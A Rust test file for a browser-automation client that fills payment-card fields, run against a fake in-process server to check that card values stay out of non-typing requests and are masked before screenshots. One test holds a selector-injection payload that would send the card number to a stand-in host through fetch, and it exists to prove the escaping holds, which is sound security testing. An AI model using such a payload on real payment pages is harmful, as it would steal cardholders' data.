//! Wire-level tests for the camofox client and the fill engine, against an
//! in-process fake camofox server (bead till-ipx acceptance criteria).
//!
//! No browser is involved: what is asserted is exactly what the broker would
//! put on the wire, which is where the ADR 0005 properties live.
//!
//! * fill goes out over `POST /tabs/:id/type` — one per field, in order — and
//!   **never** over `/evaluate`;
//! * card values appear in `/type` bodies and nowhere else;
//! * masking (`/evaluate`, selectors only) strictly precedes the screenshot;
//! * containment uses `location.replace('about:blank')` via `/evaluate`;
//! * `navigate` refuses `about:blank` without a request;
//! * a hostile agent-supplied selector cannot escape the mask expression.
//!
//! Test card values are built at runtime (`"4".repeat(16)`): `script/no-card-digits`
//! forbids a literal digit run anywhere in the tree (US-14).

use std::collections::BTreeMap;
use std::error::Error;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::extract::{Path, Query, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post};
use axum::{Json, Router};
use broker::{CamofoxPort, CardRecord, FieldKind, FieldSpec, FillRequest, PaymentId};
use camofox_client::client::CamofoxError;
use camofox_client::{CamofoxClient, CamofoxConfig, CamofoxFillEngine, SettleConfig};
use serde_json::{Value, json};

type TestResult<T> = Result<T, Box<dyn Error + Send + Sync>>;

/// One request the fake camofox saw.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Seen {
    method: &'static str,
    path: String,
    body: Value,
}

impl Seen {
    /// `METHOD /tabs/:id/type` — the tab id collapsed, so assertions read as
    /// routes rather than as uuids.
    fn route(&self) -> String {
        let path = self
            .path
            .split('/')
            .map(|part| if part.len() == 36 { ":id" } else { part })
            .collect::<Vec<_>>()
            .join("/");
        format!("{} {path}", self.method)
    }
}

#[derive(Debug, Default)]
struct Fake {
    seen: Mutex<Vec<Seen>>,
    /// Answer the settle probe with ready/unready in this order, repeating the
    /// last entry.
    settle_answers: Mutex<Vec<bool>>,
    /// Whether a mid-fill `/type` should fail (500).
    fail_type_index: Mutex<Option<usize>>,
    /// Whether the screenshot should fail (500).
    fail_screenshot: Mutex<bool>,
}

impl Fake {
    fn record(&self, method: &'static str, path: String, body: Value) {
        if let Ok(mut seen) = self.seen.lock() {
            seen.push(Seen { method, path, body });
        }
    }

    fn requests(&self) -> Vec<Seen> {
        self.seen
            .lock()
            .map(|seen| seen.clone())
            .unwrap_or_default()
    }

    fn routes(&self) -> Vec<String> {
        self.requests().iter().map(Seen::route).collect()
    }

    fn count_route(&self, route: &str) -> usize {
        self.routes().iter().filter(|seen| *seen == route).count()
    }

    fn set_settle_answers(&self, answers: Vec<bool>) {
        if let Ok(mut slot) = self.settle_answers.lock() {
            *slot = answers;
        }
    }

    fn set_fail_type_index(&self, index: Option<usize>) {
        if let Ok(mut slot) = self.fail_type_index.lock() {
            *slot = index;
        }
    }

    fn set_fail_screenshot(&self, fail: bool) {
        if let Ok(mut slot) = self.fail_screenshot.lock() {
            *slot = fail;
        }
    }

    fn next_settle(&self) -> bool {
        let mut answers = match self.settle_answers.lock() {
            Ok(answers) => answers,
            Err(_) => return true,
        };
        if answers.is_empty() {
            return true;
        }
        if answers.len() == 1 {
            answers[0]
        } else {
            answers.remove(0)
        }
    }
}

async fn start(fake: Arc<Fake>) -> TestResult<String> {
    let app = Router::new()
        .route("/", get(|| async { Json(json!({"ok": true})) }))
        .route("/tabs", post(create_tab))
        .route("/tabs/{tab}/type", post(type_into))
        .route("/tabs/{tab}/evaluate", post(evaluate))
        .route("/tabs/{tab}/click", post(click))
        .route("/tabs/{tab}/navigate", post(navigate))
        .route("/tabs/{tab}/screenshot", get(screenshot))
        .with_state(fake);

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let address = listener.local_addr()?;
    tokio::spawn(async move {
        let _ = axum::serve(listener, app).await;
    });
    Ok(format!("http://{address}"))
}

async fn create_tab(State(fake): State<Arc<Fake>>, Json(body): Json<Value>) -> Response {
    fake.record("POST", "/tabs".to_string(), body);
    Json(json!({ "ok": true, "tabId": "11111111-1111-1111-1111-111111111111" })).into_response()
}

async fn type_into(
    State(fake): State<Arc<Fake>>,
    Path(tab): Path<String>,
    Json(body): Json<Value>,
) -> Response {
    let path = format!("/tabs/{tab}/type");
    fake.record("POST", path.clone(), body);
    // Index of *this* /type request: the route was already recorded above.
    let index = fake.count_route("POST /tabs/:id/type") - 1;
    let fail = fake
        .fail_type_index
        .lock()
        .map(|slot| *slot == Some(index))
        .unwrap_or(false);
    if fail {
        return StatusCode::INTERNAL_SERVER_ERROR.into_response();
    }
    Json(json!({ "ok": true })).into_response()
}

async fn evaluate(
    State(fake): State<Arc<Fake>>,
    Path(tab): Path<String>,
    Json(body): Json<Value>,
) -> Response {
    let path = format!("/tabs/{tab}/evaluate");
    let expression = body
        .get("expression")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_string();
    fake.record("POST", path, body);

    // The settle probe asks a yes/no question; everything else is either
    // masking (returns a count) or containment (returns a marker).
    if expression.contains("readyState") {
        let ready = fake.next_settle();
        return Json(json!({ "ok": true, "result": ready })).into_response();
    }
    if expression.contains("location.replace") {
        return Json(json!({ "ok": true, "result": "contained" })).into_response();
    }
    Json(json!({ "ok": true, "result": 2 })).into_response()
}

async fn click(
    State(fake): State<Arc<Fake>>,
    Path(tab): Path<String>,
    Json(body): Json<Value>,
) -> Response {
    fake.record("POST", format!("/tabs/{tab}/click"), body);
    Json(json!({ "ok": true })).into_response()
}

async fn navigate(
    State(fake): State<Arc<Fake>>,
    Path(tab): Path<String>,
    Json(body): Json<Value>,
) -> Response {
    fake.record("POST", format!("/tabs/{tab}/navigate"), body);
    Json(json!({ "ok": true })).into_response()
}

async fn screenshot(
    State(fake): State<Arc<Fake>>,
    Path(tab): Path<String>,
    Query(query): Query<BTreeMap<String, String>>,
) -> Response {
    let body = json!({ "query": query });
    fake.record("GET", format!("/tabs/{tab}/screenshot"), body);
    let fail = fake
        .fail_screenshot
        .lock()
        .map(|flag| *flag)
        .unwrap_or(false);
    if fail {
        return StatusCode::INTERNAL_SERVER_ERROR.into_response();
    }
    let mut png = vec![0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a];
    png.extend_from_slice(&[0u8; 8]);
    (StatusCode::OK, [("content-type", "image/png")], png).into_response()
}

/// Synthetic card values, built at runtime (never a literal digit run).
fn card() -> TestResult<CardRecord> {
    Ok(CardRecord::parse(
        &"4".repeat(16),
        "12/34",
        &"1".repeat(3),
        "Test Holder",
        &"1".repeat(5),
    )?)
}

fn fields() -> Vec<FieldSpec> {
    vec![
        FieldSpec {
            selector: "#card".to_string(),
            field_kind: FieldKind::CardNumber,
        },
        FieldSpec {
            selector: "#expiry".to_string(),
            field_kind: FieldKind::Expiry,
        },
        FieldSpec {
            selector: "#cvv".to_string(),
            field_kind: FieldKind::Cvv,
        },
    ]
}

fn engine(base_url: &str) -> TestResult<(CamofoxFillEngine, CamofoxClient)> {
    let config = CamofoxConfig::new(base_url, "jamie")?;
    let client = CamofoxClient::new(config)?;
    let engine = CamofoxFillEngine::new(client.clone()).with_settle(SettleConfig::new(
        Duration::from_secs(2),
        Duration::from_millis(5),
    ));
    Ok((engine, client))
}

const TAB: &str = "11111111-1111-1111-1111-111111111111";

// ---------------------------------------------------------------------------
// The fill primitive (ADR 0005 Decision 3)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn fill_posts_type_per_field_and_never_calls_evaluate() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;
    let card = card()?;

    engine
        .fill_fields(FillRequest {
            payment_id: PaymentId::new(),
            tab_id: TAB,
            fields: &fields(),
            card: &card,
        })
        .await?;

    assert_eq!(
        fake.count_route("POST /tabs/:id/type"),
        3,
        "one /type per declared field: {:?}",
        fake.routes()
    );
    assert_eq!(
        fake.count_route("POST /tabs/:id/evaluate"),
        0,
        "the fill must never use evaluate (ADR 0005)"
    );
    Ok(())
}

#[tokio::test]
async fn fill_failure_stops_the_pass_with_no_retry() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    fake.set_fail_type_index(Some(1));
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;
    let card = card()?;

    let outcome = engine
        .fill_fields(FillRequest {
            payment_id: PaymentId::new(),
            tab_id: TAB,
            fields: &fields(),
            card: &card,
        })
        .await;

    assert!(outcome.is_err(), "a failed field fails the whole fill");
    assert_eq!(
        fake.count_route("POST /tabs/:id/type"),
        2,
        "the pass stops at the failure and never repeats a field: {:?}",
        fake.routes()
    );
    Ok(())
}

#[tokio::test]
async fn card_values_appear_only_in_type_bodies() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;
    let card = card()?;
    // Every value the vault holds for this card: a `/type` body carries one of
    // them, and nothing else may carry any of them.
    let values = {
        let held = card.fields();
        [
            held.card_number.to_string(),
            held.expiry.to_string(),
            held.cvv.to_string(),
            held.cardholder_name.to_string(),
            held.billing_postcode.to_string(),
        ]
    };

    engine
        .fill_fields(FillRequest {
            payment_id: PaymentId::new(),
            tab_id: TAB,
            fields: &fields(),
            card: &card,
        })
        .await?;
    engine.click_submit(PaymentId::new(), TAB, "#pay").await?;
    engine.wait_for_settle(PaymentId::new(), TAB).await?;
    engine
        .capture_masked_result(PaymentId::new(), TAB, &fields())
        .await?;
    engine.contain_tab(PaymentId::new(), TAB).await?;

    let requests = fake.requests();
    let mut typed = 0;
    for seen in &requests {
        let body = seen.body.to_string();
        let is_type = seen.route() == "POST /tabs/:id/type";
        if is_type {
            let text = seen
                .body
                .get("text")
                .and_then(Value::as_str)
                .unwrap_or_default();
            assert!(
                values.iter().any(|value| value == text),
                "a /type body types exactly one card value, got {text:?}"
            );
            typed += 1;
        } else {
            for value in &values {
                assert!(
                    !body.contains(value.as_str()),
                    "no non-/type request may carry a card value: {} {}",
                    seen.route(),
                    body
                );
            }
        }
    }
    assert_eq!(typed, 3, "every field was typed exactly once");
    Ok(())
}

// ---------------------------------------------------------------------------
// Mask-before-capture (US-10)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn masked_capture_clears_fields_before_screenshot() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;

    let png = engine
        .capture_masked_result(PaymentId::new(), TAB, &fields())
        .await?;

    assert!(
        png.starts_with(&[0x89, b'P', b'N', b'G']),
        "PNG bytes returned"
    );

    let routes = fake.routes();
    let mask_at = routes
        .iter()
        .position(|route| route == "POST /tabs/:id/evaluate")
        .ok_or("no mask evaluate")?;
    let shot_at = routes
        .iter()
        .position(|route| route == "GET /tabs/:id/screenshot")
        .ok_or("no screenshot")?;
    assert!(
        mask_at < shot_at,
        "the fields are cleared before the capture: {routes:?}"
    );

    // The mask expression references selectors only, never a value.
    let mask = fake
        .requests()
        .get(mask_at)
        .and_then(|seen| seen.body.get("expression").cloned())
        .unwrap_or(Value::Null)
        .to_string();
    assert!(mask.contains("#card"), "the mask names the fields");
    assert!(
        !mask.contains(&"4".repeat(16)),
        "the mask expression carries no card value"
    );
    Ok(())
}

#[tokio::test]
async fn hostile_selector_cannot_escape_the_mask_expression() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;
    let hostile = vec![FieldSpec {
        selector: "#card\"]);fetch('https://example.invalid/x?pan='+document.querySelector('#card').value);(//"
            .to_string(),
        field_kind: FieldKind::CardNumber,
    }];

    engine
        .capture_masked_result(PaymentId::new(), TAB, &hostile)
        .await?;

    let expression = fake
        .requests()
        .into_iter()
        .find(|seen| seen.route() == "POST /tabs/:id/evaluate")
        .and_then(|seen| seen.body.get("expression").cloned())
        .unwrap_or(Value::Null)
        .to_string();
    // serde_json escaped the quote, so the injected code is inside the string.
    assert!(
        expression.contains("\\\""),
        "the selector's quote is escaped into a JSON string: {expression}"
    );
    Ok(())
}

// ---------------------------------------------------------------------------
// Containment (spec §7) and navigate's about:blank refusal (spike finding B)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn containment_expression_is_digit_free_and_uses_location_replace() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;

    engine.contain_tab(PaymentId::new(), TAB).await?;

    assert_eq!(
        fake.count_route("POST /tabs/:id/navigate"),
        0,
        "containment never uses /navigate"
    );
    let expression = fake
        .requests()
        .into_iter()
        .find(|seen| seen.route() == "POST /tabs/:id/evaluate")
        .and_then(|seen| seen.body.get("expression").cloned())
        .unwrap_or(Value::Null)
        .to_string();
    assert!(
        expression.contains("location.replace('about:blank')"),
        "containment replaces the location with about:blank: {expression}"
    );
    Ok(())
}

#[tokio::test]
async fn navigate_refuses_about_blank_locally() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (_engine, client) = engine(&start(Arc::clone(&fake)).await?)?;

    let outcome = client.navigate(TAB, "about:blank").await;

    assert_eq!(
        outcome,
        Err(CamofoxError::Url),
        "camofox rejects it server-side"
    );
    assert_eq!(
        fake.count_route("POST /tabs/:id/navigate"),
        0,
        "the refusal is local: no request is sent"
    );
    Ok(())
}

// ---------------------------------------------------------------------------
// Settle detection (spike finding C: /wait is unusable near a submit)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn settle_polls_digit_free_until_ready_then_returns() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    fake.set_settle_answers(vec![false, false, true]);
    let (engine, _client) = engine(&start(Arc::clone(&fake)).await?)?;

    engine.wait_for_settle(PaymentId::new(), TAB).await?;

    assert_eq!(
        fake.count_route("POST /tabs/:id/evaluate"),
        3,
        "two unready probes then one ready: {:?}",
        fake.routes()
    );
    assert_eq!(
        fake.count_route("POST /tabs/:id/wait"),
        0,
        "/wait is never called (spike finding C)"
    );
    Ok(())
}

#[tokio::test]
async fn settle_gives_up_when_the_page_never_settles() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    fake.set_settle_answers(vec![false]);
    let config = CamofoxConfig::new(&start(Arc::clone(&fake)).await?, "jamie")?;
    let engine = CamofoxFillEngine::new(CamofoxClient::new(config)?).with_settle(
        SettleConfig::new(Duration::from_millis(50), Duration::from_millis(5)),
    );

    let outcome = engine.wait_for_settle(PaymentId::new(), TAB).await;

    assert!(
        outcome.is_err(),
        "a page that never settles is bounded, not hung"
    );
    Ok(())
}

// ---------------------------------------------------------------------------
// Client basics
// ---------------------------------------------------------------------------

#[tokio::test]
async fn create_tab_sends_the_configured_user_id() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    let (_engine, client) = engine(&start(Arc::clone(&fake)).await?)?;

    let tab = client
        .create_tab(Some("https://shop.example/checkout"))
        .await?;

    assert_eq!(tab, TAB);
    let body = fake
        .requests()
        .into_iter()
        .find(|seen| seen.route() == "POST /tabs")
        .ok_or("no POST /tabs")?
        .body;
    assert_eq!(
        body["userId"],
        json!("jamie"),
        "the broker acts as the agent's userId (spike Q3)"
    );
    assert_eq!(body["url"], json!("https://shop.example/checkout"));
    Ok(())
}

#[tokio::test]
async fn screenshot_failure_is_a_status_error() -> TestResult<()> {
    let fake = Arc::new(Fake::default());
    fake.set_fail_screenshot(true);
    let (_engine, client) = engine(&start(Arc::clone(&fake)).await?)?;

    assert_eq!(client.screenshot(TAB).await, Err(CamofoxError::Status));
    Ok(())
}
